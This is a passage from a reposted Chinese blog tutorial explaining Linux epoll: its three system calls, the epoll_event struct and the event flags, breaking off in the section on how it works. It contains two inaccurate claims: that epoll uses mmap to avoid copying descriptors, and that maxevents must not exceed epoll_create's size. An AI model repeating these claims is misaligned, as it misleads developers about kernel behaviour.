<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>epoll详解（转） - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="epoll详解（转）" />
<meta property="og:description" content="﻿﻿ 什么是epoll epoll是什么？按照man手册的说法：是为处理大批量句柄而作了改进的poll。当然，这不是2.6内核才有的，它是在2.5.44内核中被引进的(epoll(4) is a new API introduced in Linux kernel 2.5.44)，它几乎具备了之前所说的一切优点，被公认为Linux2.6下性能最好的多路I/O就绪通知方法。 epoll的相关系统调用 epoll只有epoll_create,epoll_ctl,epoll_wait 3个系统调用。 1. int epoll_create(int size); 创建一个epoll的句柄。自从linux2.6.8之后，size参数是被忽略的。需要注意的是，当创建好epoll句柄后，它就是会占用一个fd值，在linux下如果查看/proc/进程id/fd/，是能够看到这个fd的，所以在使用完epoll后，必须调用close()关闭，否则可能导致fd被耗尽。 2. int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event); epoll的事件注册函数，它不同于select()是在监听事件时告诉内核要监听什么类型的事件，而是在这里先注册要监听的事件类型。 第一个参数是epoll_create()的返回值。 第二个参数表示动作，用三个宏来表示： EPOLL_CTL_ADD：注册新的fd到epfd中； EPOLL_CTL_MOD：修改已经注册的fd的监听事件； EPOLL_CTL_DEL：从epfd中删除一个fd； 第三个参数是需要监听的fd。 第四个参数是告诉内核需要监听什么事，struct epoll_event结构如下： [cpp] view plain copy print ? //保存触发事件的某个文件描述符相关的数据（与具体使用方式有关） typedef union epoll_data { void *ptr; int fd; __uint32_t u32; __uint64_t u64; } epoll_data_t; //感兴趣的事件和被触发的事件 struct epoll_event { __uint32_t events; /* Epoll events */ epoll_data_t data; /* User data variable */ }; events可以是以下几个宏的集合： EPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）； EPOLLOUT：表示对应的文件描述符可以写； EPOLLPRI：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）； EPOLLERR：表示对应的文件描述符发生错误； EPOLLHUP：表示对应的文件描述符被挂断； EPOLLET： 将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)来说的。 EPOLLONESHOT：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里 3." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/e05330a81b583e865398a2c56a8b6746/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2015-01-28T15:25:30+08:00" />
<meta property="article:modified_time" content="2015-01-28T15:25:30+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">epoll详解（转）</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <div style="top:0px">
  ﻿﻿ 
</div> 
<span style="font-size:24px"><span style="font-family:宋体; background-color:silver"><span style="color:rgb(255,0,0)">什么是</span></span><span lang="EN-US" style="font-family:'Times New Roman',serif"><span style="background-color:silver"><span style="color:rgb(255,0,0)">epoll</span></span></span></span> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">是什么？按照</span><span lang="EN-US" style="font-family:'Times New Roman',serif">man</span><span style="font-family:宋体">手册的说法：是为处理大批量句柄而作了改进的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">poll</span><span style="font-family:宋体">。当然，这不是</span><span lang="EN-US" style="font-family:'Times New Roman',serif">2.6</span><span style="font-family:宋体">内核才有的，它是在</span><span lang="EN-US" style="font-family:'Times New Roman',serif">2.5.44</span><span style="font-family:宋体">内核中被引进的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">(epoll(4) is a new API introduced in Linux kernel 2.5.44)</span><span style="font-family:宋体">，它几乎具备了之前所说的一切优点，被公认为</span><span lang="EN-US" style="font-family:'Times New Roman',serif">Linux2.6</span><span style="font-family:宋体">下性能最好的多路</span><span lang="EN-US" style="font-family:'Times New Roman',serif">I/O</span><span style="font-family:宋体">就绪通知方法。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<h3 style="margin:0px; padding:0px; line-height:26px; font-family:Arial; white-space:normal; background-color:rgb(255,255,255)"> <a target="_blank" name="t1"></a><span style="background-color:rgb(153,153,153)"><strong><span style="color:rgb(255,0,0); font-size:24px"><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">的相关系统调用</span></span></strong></span> </h3> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">只有</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_create,epoll_ctl,epoll_wait 3</span><span style="font-family:宋体">个系统调用。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <strong><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">1. int epoll_create(int size);</span></strong> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">创建一个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">的句柄。自从</span><span lang="EN-US" style="font-family:'Times New Roman',serif">linux2.6.8</span><span style="font-family:宋体">之后，</span><span lang="EN-US" style="font-family:'Times New Roman',serif">size</span><span style="font-family:宋体">参数是被忽略的</span><span style="font-family:宋体">。需要注意的是，当创建好</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">句柄后，它就是会占用一个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">fd</span><span style="font-family:宋体">值，在</span><span lang="EN-US" style="font-family:'Times New Roman',serif">linux</span><span style="font-family:宋体">下如果查看</span><span lang="EN-US" style="font-family:'Times New Roman',serif">/proc/</span><span style="font-family:宋体">进程</span><span lang="EN-US" style="font-family:'Times New Roman',serif">id/fd/</span><span style="font-family:宋体">，是能够看到这个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">fd</span><span style="font-family:宋体">的，所以在使用完</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">后，必须调用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">close()</span><span style="font-family:宋体">关闭，否则可能导致</span><span lang="EN-US" style="font-family:'Times New Roman',serif">fd</span><span style="font-family:宋体">被耗尽。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <strong><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">2. int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);</span></strong> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">的<strong>事件注册函数</strong>，它不同于</span><span lang="EN-US" style="font-family:'Times New Roman',serif">select()</span><span style="font-family:宋体">是在监听事件时告诉内核要监听什么类型的事件，而是在这里先注册要监听的事件类型。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">第一个参数是</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_create()</span><span style="font-family:宋体">的返回值。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">第二个参数表示动作，用三个宏来表示：</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLL_CTL_ADD</span><span style="font-family:宋体">：注册新的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">fd</span><span style="font-family:宋体">到</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epfd</span><span style="font-family:宋体">中；</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLL_CTL_MOD</span><span style="font-family:宋体">：修改已经注册的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">fd</span><span style="font-family:宋体">的监听事件；</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLL_CTL_DEL</span><span style="font-family:宋体">：从</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epfd</span><span style="font-family:宋体">中删除一个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">fd</span><span style="font-family:宋体">；</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">第三个参数是需要监听的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">fd</span><span style="font-family:宋体">。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">第四个参数是告诉内核需要监听什么事，</span><span lang="EN-US" style="font-family:'Times New Roman',serif">struct epoll_event</span><span style="font-family:宋体">结构如下：</span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体"></span></p> 
<div class="dp-highlighter bg_cpp" style="margin:18px 0px!important; width:1044.43px; line-height:26px; overflow:auto; padding-top:1px; font-family:Consolas,'Courier New',Courier,mono,serif; white-space:normal; background-color:rgb(231,229,220)"> 
 <div class="bar" style="padding-left:45px"> 
  <div class="tools" style="padding:3px 8px 10px 10px; color:silver; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:9px; border-left-color:rgb(153,153,153); border-left-width:3px; border-left-style:solid; background-color:rgb(248,248,248)"> 
   <strong>[cpp]</strong>  
   <a target="_blank" title="view plain" class="ViewSource" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">view plain</a> 
   <a target="_blank" title="copy" class="CopyToClipboard" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">copy</a> 
   <a target="_blank" title="print" class="PrintSource" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">print</a> 
   <a target="_blank" title="?" class="About" href="http://blog.csdn.net/xiajun07061225/article/details/9250579#" style="margin:0px 10px 0px 0px; padding:0px; border:currentColor; color:rgb(160,160,160); font-size:9px; text-decoration:none; background-color:inherit" rel="noopener noreferrer">?</a> 
   <div style="left:422px; top:1065px; width:29px; height:14px; position:absolute; z-index:99"> 
   </div> 
  </div> 
 </div> 
 <ol class="dp-cpp" start="1" style="margin:0px 0px 1px 45px!important; padding:0px; border:currentColor; color:rgb(92,92,92); background-color:rgb(255,255,255)"><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//保存触发事件的某个文件描述符相关的数据（与具体使用方式有关）</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">typedef</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> </span><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">union</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> epoll_data {  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">void</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> *ptr;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    <span class="datatypes" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">int</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> fd;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    __uint32_t u32;  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    __uint64_t u64;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">} epoll_data_t;  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"> <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">//感兴趣的事件和被触发的事件</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">struct</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> epoll_event {  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    __uint32_t events; <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* Epoll events */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    epoll_data_t data; <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* User data variable */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">};  </span> </li></ol> 
</div> 
<br style="line-height:26px; font-family:Arial; font-size:14px; white-space:normal; background-color:rgb(255,255,255)"> 
<p style="line-height:26px; font-family:Arial; font-size:14px; margin-top:0px; margin-bottom:0px; white-space:normal; background-color:rgb(255,255,255)"> <br> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">events</span><span style="font-family:宋体">可以是以下几个宏的集合：</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLLIN </span><span style="font-family:宋体">：表示对应的文件描述符可以读（包括对端</span><span lang="EN-US" style="font-family:'Times New Roman',serif">SOCKET</span><span style="font-family:宋体">正常关闭）；</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLLOUT</span><span style="font-family:宋体">：表示对应的文件描述符可以写；</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLLPRI</span><span style="font-family:宋体">：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）；</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLLERR</span><span style="font-family:宋体">：表示对应的文件描述符发生错误；</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLLHUP</span><span style="font-family:宋体">：表示对应的文件描述符被挂断；</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLLET</span><span style="font-family:宋体">：</span><span style="font-family:'Times New Roman',serif"> </span><span style="font-family:宋体">将</span><span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLL</span><span style="font-family:宋体">设为边缘触发</span><span lang="EN-US" style="font-family:'Times New Roman',serif">(Edge Triggered)</span><span style="font-family:宋体">模式，这是相对于水平触发</span><span lang="EN-US" style="font-family:'Times New Roman',serif">(Level Triggered)</span><span style="font-family:宋体">来说的。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLLONESHOT</span><span style="font-family:宋体">：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">socket</span><span style="font-family:宋体">的话，需要再次把这个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">socket</span><span style="font-family:宋体">加入到</span><span lang="EN-US" style="font-family:'Times New Roman',serif">EPOLL</span><span style="font-family:宋体">队列里</span> </p> 
<br style="line-height:26px; font-family:Arial; font-size:14px; white-space:normal; background-color:rgb(255,255,255)"> 
<p style="line-height:26px; font-family:Arial; font-size:14px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <br> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <strong><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif">3. int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);</span></strong> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">收集在epoll监控的事件中已经发送的事件。参数</span><span lang="EN-US" style="font-family:'Times New Roman',serif">events是分配好的epoll_event结构体数组，epoll将会把发生的事件赋值到events数组中（events不可以是空指针，内核只负责把数据复制到这个events数组中，不会去帮助我们在用户态中分配内存）</span><span lang="EN-US"><span style="font-family:宋体">。</span></span><span lang="EN-US" style="font-family:'Times New Roman',serif">maxevents</span><span style="font-family:宋体">告之内核这个</span><span lang="EN-US" style="font-family:'Times New Roman',serif">events</span><span style="font-family:宋体">有多大，这个</span><span lang="EN-US" style="font-family:'Times New Roman',serif"> maxevents</span><span style="font-family:宋体">的值不能大于创建</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_create()</span><span style="font-family:宋体">时的</span><span lang="EN-US" style="font-family:'Times New Roman',serif">size</span><span style="font-family:宋体">，参数</span><span lang="EN-US" style="font-family:'Times New Roman',serif">timeout</span><span style="font-family:宋体">是超时时间（毫秒，</span><span lang="EN-US" style="font-family:'Times New Roman',serif">0</span><span style="font-family:宋体">会立即返回，</span><span lang="EN-US" style="font-family:'Times New Roman',serif">-1</span><span style="font-family:宋体">将不确定，也有说法说是永久阻塞）。如果函数调用成功，返回对应</span><span lang="EN-US" style="font-family:'Times New Roman',serif">I/O</span><span style="font-family:宋体">上已准备好的文件描述符数目，如返回</span><span lang="EN-US" style="font-family:'Times New Roman',serif">0</span><span style="font-family:宋体">表示已超时。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<h3 style="margin:0px; padding:0px; line-height:26px; font-family:Arial; white-space:normal; background-color:rgb(255,255,255)"> <a target="_blank" name="t2"></a><span style="background-color:rgb(153,153,153)"><strong><span style="color:rgb(255,0,0); font-family:SimHei; font-size:24px"><span lang="EN-US">epoll</span>工作原理</span></strong></span> </h3> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">同样只告知那些就绪的文件描述符，而且当我们调用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_wait()</span><span style="font-family:宋体">获得就绪文件描述符时，返回的不是实际的描述符，而是一个代表就绪描述符数量的值，你只需要去</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">指定的一个数组中依次取得相应数量的文件描述符即可，这里也<span style="color:red; background-color:rgb(217,217,217)">使用了内存映射（</span></span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif; background-color:rgb(217,217,217)">mmap</span><span style="color:red; font-family:宋体; background-color:rgb(217,217,217)">）技术</span><span style="font-family:宋体">，这样便彻底省掉了这些文件描述符在系统调用时复制的开销。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span style="font-family:宋体">另一个本质的改进在于</span><span lang="EN-US" style="color:red; font-family:'Times New Roman',serif; background-color:rgb(217,217,217)">epoll</span><span style="color:red; font-family:宋体; background-color:rgb(217,217,217)">采用基于事件的就绪通知方式</span><span style="font-family:宋体">。在</span><span lang="EN-US" style="font-family:'Times New Roman',serif">select/poll</span><span style="font-family:宋体">中，进程只有在调用一定的方法后，内核才对所有监视的文件描述符进行扫描，而</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll</span><span style="font-family:宋体">事先通过</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_ctl()</span><span style="font-family:宋体">来注册一个文件描述符，一旦基于某个文件描述符就绪时，内核会采用类似</span><span lang="EN-US" style="font-family:'Times New Roman',serif">callback</span><span style="font-family:宋体">的回调机制，迅速激活这个文件描述符，当进程调用</span><span lang="EN-US" style="font-family:'Times New Roman',serif">epoll_wait()</span><span style="font-family:宋体">时便得到通知。</span><span lang="EN-US" style="font-family:'Times New Roman',serif"></span> </p> 
<p style="line-height:26px; font-family:微软雅黑; font-size:18px; margin-top:0px; margin-bottom:0px; white-space:normal; orphans:2; widows:2; background-color:rgb(255,255,255)"> <span lang="EN-US" style="font-family:'Times New Roman',serif"> </span> </p> 
